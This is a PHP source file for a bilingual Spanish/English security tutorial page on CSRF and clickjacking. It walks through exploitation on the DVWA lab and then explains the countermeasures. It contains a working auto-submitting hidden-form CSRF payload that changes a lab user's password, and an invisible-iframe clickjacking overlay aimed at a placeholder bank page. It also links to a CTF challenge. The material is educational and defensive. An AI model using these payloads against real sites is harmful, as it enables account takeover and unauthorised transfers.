<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'CSRF y Clickjacking — CyberEscudo' : 'CSRF & Clickjacking — CyberEscudo';
$contentTitle = $lang==='es' ? 'CSRF y Clickjacking' : 'CSRF & Clickjacking';
$contentDate  = '2022-04-12';
$contentTags  = ['CSRF','Clickjacking','OWASP','Tokens','X-Frame-Options'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Estudio práctico de las vulnerabilidades <strong>CSRF</strong> (Cross-Site Request Forgery) y <strong>Clickjacking</strong> (UI Redressing), su explotación en DVWA y sus contramedidas. Ambas técnicas abusan de la confianza que una aplicación web tiene en el navegador del usuario.</p>

  <h2>1. CSRF — Falsificación de Petición en Sitios Cruzados</h2>
  <p>En un ataque CSRF, el atacante engaña a un usuario autenticado para que ejecute acciones no deseadas (como cambiar su contraseña o transferir dinero) en una aplicación web donde la víctima ya tiene una sesión activa.</p>
  
  <h3>El problema de las "Ambient Credentials"</h3>
  <p>El CSRF existe por cómo funcionan los navegadores web: si tienes sesión iniciada en <code>banco.com</code> y navegas a <code>web-maliciosa.com</code>, si esta última web envía una petición oculta de vuelta a <code>banco.com</code>, tu navegador adjuntará <strong>automáticamente</strong> tus cookies de sesión a esa petición. El banco pensará que fuiste tú quien hizo la solicitud legítimamente.</p>

  <h3>Explotación en DVWA (nivel low)</h3>
  <p>Si la web no requiere un "token" único por cada formulario, podemos predecir los parámetros y forzar su envío mediante JavaScript tan pronto como la víctima abra nuestro enlace:</p>
  <pre><code>&lt;!-- Página maliciosa alojada por el atacante --&gt;
&lt;!-- El evento onload hace que el formulario se envíe instantáneamente sin interacción --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;h1&gt;Cargando video de gatitos...&lt;/h1&gt;
  &lt;form action="http://10.0.2.4/dvwa/vulnerabilities/csrf/" method="GET" style="display:none;"&gt;
    &lt;input type="hidden" name="password_new" value="hackeado"&gt;
    &lt;input type="hidden" name="password_conf" value="hackeado"&gt;
    &lt;input type="hidden" name="Change" value="Change"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 04 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Laboratorio CSRF Activo
      </h3>
      <p style="margin-bottom: 1.5rem;">Entra al simulador bancario y demuestra que sabes crear un payload HTML malicioso (PoC) capaz de forzar una transferencia de fondos abusando del navegador de la víctima.</p>
      <a href="/ctf/ctf-04.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 04
      </a>
  </div>

  <h3>Contramedidas Anti-CSRF</h3>
  <ol>
    <li><strong>Tokens Anti-CSRF (Sincronizador de Tokens):</strong> La defensa principal. Un valor aleatorio e impredecible generado en el servidor que debe incluirse en cada formulario. El atacante, al estar en otro dominio, no puede leer ni adivinar este token.</li>
    <li><strong>Atributo SameSite en Cookies:</strong> Configurar <code>SameSite=Lax</code> o <code>Strict</code> evita que el navegador envíe las cookies de sesión si la petición se origina desde un dominio externo.</li>
  </ol>

  <h2>2. Clickjacking (UI Redressing)</h2>
  <p>A diferencia del CSRF que actúa "por debajo", el Clickjacking es un ataque visual. El atacante superpone un marco invisible (iframe) que contiene una página legítima (ej: tu banco) justo encima de un botón inofensivo de la web maliciosa. El usuario cree que está haciendo clic en "Gana un premio", pero en realidad está haciendo clic en "Confirmar Transferencia" de su banco.</p>

  <h3>Demostración de Opacidad en CSS</h3>
  <pre><code>&lt;!-- El atacante enmarca la web vulnerable --&gt;
&lt;style&gt;
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;   /* Prácticamente invisible, pero el clic funciona */
    z-index: 999;      /* Forzamos que esté por encima de todo */
  }
  .boton-cebo {
    position: absolute; top: 200px; left: 300px; z-index: 1;
  }
&lt;/style&gt;

&lt;div class="boton-cebo"&gt;¡Haz clic para ver el contenido!&lt;/div&gt;
&lt;iframe src="https://banco.com/confirmar-transferencia"&gt;&lt;/iframe&gt;</code></pre>

  <h3>Contramedidas Anti-Clickjacking</h3>
  <p>La web legítima debe decirle al navegador: <em>"No permitas que mi sitio sea renderizado dentro de un iframe"</em>. Esto se logra enviando cabeceras HTTP específicas:</p>
  <pre><code># 1. Content Security Policy (El estándar moderno y preferido):
Header set Content-Security-Policy "frame-ancestors 'none';"

# 2. X-Frame-Options (Soporte para navegadores antiguos):
Header set X-Frame-Options "DENY"
# o SAMEORIGIN si necesitas enmarcarlo dentro de tu propio dominio.</code></pre>

</div>
<?php else: ?>
<div class="prose">
  <p>Practical study of <strong>CSRF</strong> (Cross-Site Request Forgery) and <strong>Clickjacking</strong> (UI Redressing) vulnerabilities, including exploitation on DVWA and modern countermeasures.</p>

  <h2>1. CSRF — Cross-Site Request Forgery</h2>
  <p>The attacker tricks an authenticated user into executing unwanted actions on a web application where they have an active session (e.g., changing passwords or transferring funds).</p>

  <h3>The "Ambient Credentials" Issue</h3>
  <p>CSRF relies on standard browser behavior: if you are logged into <code>bank.com</code> and visit <code>evil-site.com</code>, and the evil site sends a hidden request back to <code>bank.com</code>, your browser will <strong>automatically</strong> attach your session cookies. The bank processes the request thinking it was intentionally made by you.</p>

  <h3>Exploitation on DVWA</h3>
  <p>By creating a malicious HTML page with an auto-submitting form, we can force state-changing requests without the user even clicking a button:</p>
  <pre><code>&lt;!-- Malicious page sent to the victim --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;h1&gt;Loading funny cats...&lt;/h1&gt;
  &lt;form action="http://10.0.2.4/dvwa/vulnerabilities/csrf/" method="GET" style="display:none;"&gt;
    &lt;input type="hidden" name="password_new" value="hacked"&gt;
    &lt;input type="hidden" name="password_conf" value="hacked"&gt;
    &lt;input type="hidden" name="Change" value="Change"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 04 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> Active CSRF Lab
      </h3>
      <p style="margin-bottom: 1.5rem;">Enter the banking simulator and prove you can craft a malicious HTML payload (PoC) capable of forcing a fund transfer by abusing the victim's browser.</p>
      <a href="/ctf/ctf-04.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 04 CHALLENGE
      </a>
  </div>

  <h3>CSRF Countermeasures</h3>
  <ul>
    <li><strong>Anti-CSRF Tokens:</strong> A cryptographically strong, unpredictable token generated by the server and embedded into every form. The attacker cannot read or guess this token due to the Same-Origin Policy.</li>
    <li><strong>SameSite Cookie Attribute:</strong> Setting <code>SameSite=Lax</code> or <code>Strict</code> instructs the browser not to send cookies along with cross-site requests.</li>
  </ul>

  <h2>2. Clickjacking (UI Redressing)</h2>
  <p>The attacker overlays an invisible iframe of a legitimate page (like your bank) on top of a decoy button. The user thinks they are clicking "Win a prize", but they are actually clicking the bank's hidden "Confirm Transfer" button.</p>

  <h3>CSS Opacity Demonstration</h3>
  <pre><code>&lt;style&gt;
  iframe {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;   /* Invisible but interactive */
    z-index: 999;
  }
  .fake-button { position: absolute; top: 200px; left: 300px; z-index: 1; }
&lt;/style&gt;

&lt;div class="fake-button"&gt;Click for free access!&lt;/div&gt;
&lt;iframe src="https://bank.com/transfer"&gt;&lt;/iframe&gt;</code></pre>

  <h3>Clickjacking Countermeasures</h3>
  <p>The legitimate site must declare that it shouldn't be framed:</p>
  <pre><code"># 1. CSP frame-ancestors directive (modern, preferred):
Header set Content-Security-Policy "frame-ancestors 'none';"

# 2. X-Frame-Options HTTP header (legacy support):
Header set X-Frame-Options "DENY"</code></pre>

</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';